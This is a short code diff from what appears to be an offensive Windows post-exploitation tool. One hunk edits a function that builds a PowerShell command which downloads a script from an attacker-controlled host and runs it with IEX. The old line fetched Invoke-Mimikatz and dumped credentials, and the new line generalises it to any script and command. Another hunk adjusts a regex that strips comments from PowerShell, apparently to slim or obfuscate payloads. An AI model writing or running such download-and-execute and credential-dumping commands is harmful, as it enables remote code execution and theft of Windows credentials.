@@ -195,8 +195,8 @@ def windows_ps_ask_creds_tcp():
 
 def windows_invoke_mimikatz():
     return (
-        "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-Mimikatz.ps1\\\");"
-        "Invoke-Mimikatz -DumpCreds")
+        "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s.ps1');"
+        "%s -%s")
 
 
 def windows_uac_bypass():
@@ -220,7 +220,7 @@ def randomVar(len):
 
 
 def removeComments(string):
-    string = re.sub(re.compile(r'<#.*?#>'), '', string)
+    string = re.sub(re.compile(r'<\#.*?\#>', flags=re.DOTALL), '', string)
     string = re.sub(re.compile(r'#.*?\n'), '\\n', string)
     return string
 
